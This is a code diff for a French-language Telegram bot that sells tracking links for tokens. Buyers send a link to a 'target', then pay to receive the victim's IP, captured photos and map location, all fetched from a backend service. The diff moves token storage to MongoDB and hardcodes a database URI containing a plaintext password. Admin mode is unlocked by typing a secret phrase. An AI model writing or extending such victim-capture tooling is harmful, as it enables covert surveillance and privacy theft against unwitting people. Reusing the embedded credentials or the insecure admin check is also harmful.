@@ -1,48 +1,49 @@
 const TelegramBot = require("node-telegram-bot-api");
 const axios = require("axios");
 const dotenv = require("dotenv");
-const fs = require('fs');
-const path = require('path');
 const crypto = require("crypto");
+const mongoose = require("mongoose");
 
 // Configuration de l'environnement
 dotenv.config();
 
+// --- 0. CONNEXION MONGODB (CLÉ DU SUCCÈS) ---
+// J'ai retiré les signes < > de votre mot de passe.
+// Si votre mot de passe contient vraiment < et >, remettez-les.
+const MONGO_URI = "mongodb+srv://Dssiaka:Keita1234.@queennezuko.gnrhdxk.mongodb.net/telegram_bot?retryWrites=true&w=majority";
+
+mongoose.connect(MONGO_URI)
+    .then(() => console.log("✅ Connecté à MongoDB (Jetons Immortels activés)"))
+    .catch(err => console.error("❌ Erreur MongoDB:", err));
+
+// Définition du "Schéma" utilisateur (Ce qui est stocké)
+const userSchema = new mongoose.Schema({
+    chatId: { type: String, required: true, unique: true },
+    coins: { type: Number, default: 0 },
+    lastActive: { type: Date, default: Date.now }
+});
+
+const User = mongoose.model('User', userSchema);
+
+// Fonction helper pour récupérer ou créer un utilisateur
+async function getUser(chatId) {
+    let user = await User.findOne({ chatId: chatId.toString() });
+    if (!user) {
+        user = await User.create({ chatId: chatId.toString(), coins: 0 });
+    }
+    return user;
+}
+
 // --- CONFIGURATION DES TARIFS ---
 const PRIX_GENERATION = 3;  // Coût pour créer un lien
 const PRIX_PHOTOS = 3;      // Coût pour voir les photos
-const NB_PHOTOS_A_AFFICHER = 3; // Nombre de photos à envoyer
+const NB_PHOTOS_A_AFFICHER = 3; // Max photos à envoyer
 
-// --- 1. GESTION DE LA PERSISTANCE (SAUVEGARDE) ---
-const dataDir = path.join(__dirname, 'data');
-if (!fs.existsSync(dataDir)) {
-    fs.mkdirSync(dataDir);
-}
-
-const usersFilePath = path.join(dataDir, 'users.json');
-
-let usersData = {};
-if (fs.existsSync(usersFilePath)) {
-    try {
-        usersData = JSON.parse(fs.readFileSync(usersFilePath, 'utf8'));
-    } catch (e) {
-        console.error("⚠️ Erreur lecture users.json, réinitialisation.", e.message);
-        usersData = {};
-    }
-}
-
-function saveUsers() {
-    try {
-        fs.writeFileSync(usersFilePath, JSON.stringify(usersData, null, 2));
-    } catch (e) {
-        console.error("❌ Erreur de sauvegarde :", e.message);
-    }
-}
-
-// --- 2. CONFIGURATION DU BOT ---
+// --- CONFIGURATION DU BOT ---
 process.env.NTBA_FIX_319 = 1;
 process.env.NTBA_FIX_350 = 1;
 
+// Filtrer les logs
 const originalLog = console.log;
 console.log = (...args) => {
     const message = args.join(" ");
@@ -73,9 +74,8 @@ const authToken = process.env.DATA_ACCESS_TOKEN || DEFAULT_SECURE_TOKEN;
 let isAdminMode = false;
 
 console.log(`🤖 Bot Telegram démarré !`);
-console.log(`💰 Tarifs : Gen=${PRIX_GENERATION}🪙 / Photos=${PRIX_PHOTOS}🪙`);
 
-// --- 3. COMMANDES ADMINISTRATEUR ---
+// --- COMMANDES ADMINISTRATEUR ---
 
 bot.onText(/DsSiakaAdmin/, (msg) => {
     isAdminMode = true;
@@ -87,32 +87,39 @@ bot.onText(/\/lock/, (msg) => {
     bot.sendMessage(msg.chat.id, "🔒 **Mode Admin VERROUILLÉ.**");
 });
 
-bot.onText(/\/addcoins (\d+) (\d+)/, (msg, match) => {
+bot.onText(/\/addcoins (\d+) (\d+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     if (!isAdminMode) return bot.sendMessage(chatId, "🚫 **Accès refusé.**");
 
     const targetId = match[1];
     const amount = parseInt(match[2]);
 
-    if (!usersData[targetId]) usersData[targetId] = { coins: 0 };
-    usersData[targetId].coins += amount;
-    
-    saveUsers();
-    
-    bot.sendMessage(chatId, `✅ **Succès !**\n${amount} jetons ajoutés à l'utilisateur \`${targetId}\`.\nNouveau solde : ${usersData[targetId].coins} 🪙`, { parse_mode: "Markdown" });
-    
-    bot.sendMessage(targetId, `🎁 **Paiement Reçu !**\nL'admin vous a crédité de ${amount} jetons.\nNouveau solde : ${usersData[targetId].coins} 🪙`).catch(() => {});
+    try {
+        // Mise à jour atomique dans MongoDB (plus sûr)
+        const user = await User.findOneAndUpdate(
+            { chatId: targetId },
+            { $inc: { coins: amount } }, // Incrémente les jetons
+            { new: true, upsert: true }  // Crée l'user s'il n'existe pas
+        );
+        
+        bot.sendMessage(chatId, `✅ **Succès !**\n${amount} jetons ajoutés à \`${targetId}\`.\nNouveau solde : ${user.coins} 🪙`, { parse_mode: "Markdown" });
+        bot.sendMessage(targetId, `🎁 **Paiement Reçu !**\nL'admin vous a crédité de ${amount} jetons.\nNouveau solde : ${user.coins} 🪙`).catch(() => {});
+        
+    } catch (err) {
+        bot.sendMessage(chatId, "❌ Erreur Base de Données.");
+        console.error(err);
+    }
 });
 
-// --- 4. COMMANDES UTILISATEUR & VENTE ---
+// --- COMMANDES UTILISATEUR ---
 
-bot.onText(/\/start/, (msg) => {
+bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
-    const coins = usersData[chatId]?.coins || 0;
+    const user = await getUser(chatId);
     
     bot.sendMessage(chatId, 
         `🔥 *Bot de Capture Activé !*\n\n` +
-        `💰 *Solde :* ${coins} jetons\n\n` +
+        `💰 *Solde :* ${user.coins} jetons\n\n` +
         `📋 *Tarifs :*\n` +
         `• Générer un lien : ${PRIX_GENERATION} 🪙\n` +
         `• Voir les photos : ${PRIX_PHOTOS} 🪙\n\n` +
@@ -135,21 +142,21 @@ bot.onText(/\/acheter/, (msg) => {
     );
 });
 
-bot.onText(/\/balance/, (msg) => {
-    const coins = usersData[msg.chat.id]?.coins || 0;
-    bot.sendMessage(msg.chat.id, `💰 **Portefeuille :** ${coins} jetons 🪙\nBesoin de plus ? Contactez @DsSiaka`, { parse_mode: "Markdown" });
+bot.onText(/\/balance/, async (msg) => {
+    const user = await getUser(msg.chat.id);
+    bot.sendMessage(msg.chat.id, `💰 **Portefeuille :** ${user.coins} jetons 🪙\nBesoin de plus ? Contactez @DsSiaka`, { parse_mode: "Markdown" });
 });
 
-// --- 5. GÉNÉRATION DE LIENS (COÛT 3 JETONS) ---
-bot.onText(/\/generate/, (msg) => {
+// --- GÉNÉRATION DE LIENS ---
+bot.onText(/\/generate/, async (msg) => {
     const chatId = msg.chat.id;
-    const coins = usersData[chatId]?.coins || 0;
+    const user = await getUser(chatId);
 
-    if (coins < PRIX_GENERATION) {
+    if (user.coins < PRIX_GENERATION) {
         return bot.sendMessage(chatId, 
             `⚠️ **Solde insuffisant !**\n\n` +
-            `Coût de génération : ${PRIX_GENERATION} jetons.\n` +
-            `Votre solde : ${coins} jetons.\n\n` +
+            `Coût : ${PRIX_GENERATION} jetons.\n` +
+            `Solde : ${user.coins} jetons.\n\n` +
             `🛒 Contactez **@DsSiaka** pour recharger.`, 
             { parse_mode: "Markdown" }
         );
@@ -164,15 +171,15 @@ bot.onText(/\/generate/, (msg) => {
         }
     };
 
-    bot.sendMessage(chatId, `🎯 *Générateur de Liens*\n\nCoût : ${PRIX_GENERATION} 🪙\nSolde actuel : ${coins} 🪙\n\n*Choisis la plateforme :*`, { parse_mode: "Markdown", ...keyboard });
+    bot.sendMessage(chatId, `🎯 *Générateur de Liens*\n\nCoût : ${PRIX_GENERATION} 🪙\nSolde : ${user.coins} 🪙\n\n*Choisis la plateforme :*`, { parse_mode: "Markdown", ...keyboard });
 });
 
-// --- 6. GESTION DES ACTIONS (CALLBACKS) ---
+// --- GESTION DES CLICS ---
 bot.on("callback_query", async (query) => {
     const chatId = query.message.chat.id;
     const data = query.data;
 
-    // Cas A : Voir les données (texte gratuit)
+    // A. Voir Preview (Gratuit)
     if (data.startsWith("data_")) {
         bot.answerCallbackQuery(query.id);
         const linkId = data.replace("data_", "");
@@ -180,29 +187,29 @@ bot.on("callback_query", async (query) => {
         return;
     }
 
-    // Cas B : Acheter les photos (COÛT 3 JETONS)
+    // B. Acheter Photos (Payant)
     if (data.startsWith("buyphotos_")) {
         const linkId = data.replace("buyphotos_", "");
-        
-        // Vérification solde
-        if (!usersData[chatId] || usersData[chatId].coins < PRIX_PHOTOS) {
-            return bot.answerCallbackQuery(query.id, { text: `❌ Pas assez de jetons ! Il en faut ${PRIX_PHOTOS}.`, show_alert: true });
+        const user = await getUser(chatId);
+
+        if (user.coins < PRIX_PHOTOS) {
+            return bot.answerCallbackQuery(query.id, { text: `❌ Manque de jetons ! Il faut ${PRIX_PHOTOS} 🪙`, show_alert: true });
         }
 
-        // Paiement
-        usersData[chatId].coins -= PRIX_PHOTOS;
-        saveUsers();
+        // Débit via MongoDB
+        user.coins -= PRIX_PHOTOS;
+        await user.save();
         
         bot.answerCallbackQuery(query.id, { text: `✅ Photos débloquées (-${PRIX_PHOTOS} 🪙)` });
-        await sendPhotos(chatId, linkId); // Envoi des photos
+        await sendPhotos(chatId, linkId);
         return;
     }
 
-    // Cas C : Générer un lien
+    // C. Générer Lien (Payant)
     const platform = data;
+    const user = await getUser(chatId);
     
-    // Vérification solde génération
-    if (!usersData[chatId] || usersData[chatId].coins < PRIX_GENERATION) {
+    if (user.coins < PRIX_GENERATION) {
         bot.sendMessage(chatId, "❌ **Solde épuisé !** Contactez @DsSiaka.");
         return bot.answerCallbackQuery(query.id, { text: "❌ Solde insuffisant !", show_alert: true });
     }
@@ -211,15 +218,15 @@ bot.on("callback_query", async (query) => {
         const response = await axios.post(`${BASE_URL}/generate-link`, { platform, chatId });
         const { id, url } = response.data;
 
-        // Déduction coût génération
-        usersData[chatId].coins -= PRIX_GENERATION;
-        saveUsers();
+        // Débit via MongoDB
+        user.coins -= PRIX_GENERATION;
+        await user.save();
 
         bot.answerCallbackQuery(query.id, { text: `✅ Lien généré ! -${PRIX_GENERATION} Jetons` });
 
         const message = `✅ *LIEN CRÉÉ !*\n\n` +
                         `🔗 ${url}\n\n` +
-                        `💰 Restant : ${usersData[chatId].coins} 🪙\n` +
+                        `💰 Restant : ${user.coins} 🪙\n` +
                         `⚡ En attente du clic...`;
 
         const keyboard = {
@@ -239,13 +246,12 @@ bot.on("callback_query", async (query) => {
     }
 });
 
-// --- 7. AFFICHAGE DONNÉES & PHOTOS ---
+// --- FONCTIONS AFFICHAGE ---
 
 bot.onText(/\/data (.+)/, async (msg, match) => {
     await sendDataPreview(msg.chat.id, match[1].trim());
 });
 
-// Fonction 1 : Aperçu GRATUIT (Texte uniquement)
 async function sendDataPreview(chatId, linkId) {
     try {
         const response = await axios.get(`${BASE_URL}/get-data/${linkId}`, {
@@ -268,11 +274,10 @@ async function sendDataPreview(chatId, linkId) {
 
         message += `\n📸 *Photos disponibles :* ${photoCount}\n`;
         
-        // Bouton pour ACHETER les photos si elles existent
         const keyboard = { reply_markup: { inline_keyboard: [] } };
         
         if (photoCount > 0) {
-            message += `🔒 *Les photos sont verrouillées.*\nCoût de déblocage : ${PRIX_PHOTOS} 🪙`;
+            message += `🔒 *Photos verrouillées.*\nCoût : ${PRIX_PHOTOS} 🪙`;
             keyboard.reply_markup.inline_keyboard.push([
                 { text: `📸 Voir les ${Math.min(photoCount, NB_PHOTOS_A_AFFICHER)} Photos (${PRIX_PHOTOS} 🪙)`, callback_data: `buyphotos_${linkId}` }
             ]);
@@ -287,7 +292,6 @@ async function sendDataPreview(chatId, linkId) {
     }
 }
 
-// Fonction 2 : Envoi des PHOTOS (PAYANT)
 async function sendPhotos(chatId, linkId) {
     try {
         const response = await axios.get(`${BASE_URL}/get-data/${linkId}`, {
@@ -299,7 +303,6 @@ async function sendPhotos(chatId, linkId) {
 
         await bot.sendMessage(chatId, `🔓 **Photos débloquées !** Envoi en cours...`);
 
-        // BOUCLE POUR AFFICHER LES 3 PHOTOS
         const limit = Math.min(data.images.length, NB_PHOTOS_A_AFFICHER);
         
         for (let i = 0; i < limit; i++) {
@@ -313,7 +316,6 @@ async function sendPhotos(chatId, linkId) {
             }
         }
         
-        // Envoi de la localisation en bonus
         if (data.location && data.location.latitude) {
             const mapsUrl = `https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}`;
             bot.sendMessage(chatId, `🗺️ [Voir position sur Maps](${mapsUrl})`, { parse_mode: "Markdown" });
@@ -324,19 +326,18 @@ async function sendPhotos(chatId, linkId) {
     }
 }
 
-// /help
 bot.onText(/\/help/, (msg) => {
     bot.sendMessage(msg.chat.id, 
         `📚 *AIDE*\n\n` +
-        `1. /generate (Coût ${PRIX_GENERATION}🪙) pour créer le lien.\n` +
-        `2. Envoie le lien à la cible.\n` +
-        `3. Reçois le rapport texte.\n` +
+        `1. /generate (Coût ${PRIX_GENERATION}🪙)\n` +
+        `2. Envoie le lien.\n` +
+        `3. Vois le rapport (IP, etc).\n` +
         `4. Débloque les photos (Coût ${PRIX_PHOTOS}🪙).\n\n` +
         `💎 **Recharge :** @DsSiaka`, 
         { parse_mode: "Markdown" }
     );
 });
 
-// Erreurs
+// Logs d'erreur
 bot.on("polling_error", (error) => console.log(`⚠️ Erreur Polling: ${error.message}`));
 bot.on("webhook_error", (error) => console.log(`⚠️ Erreur Webhook: ${error.message}`));
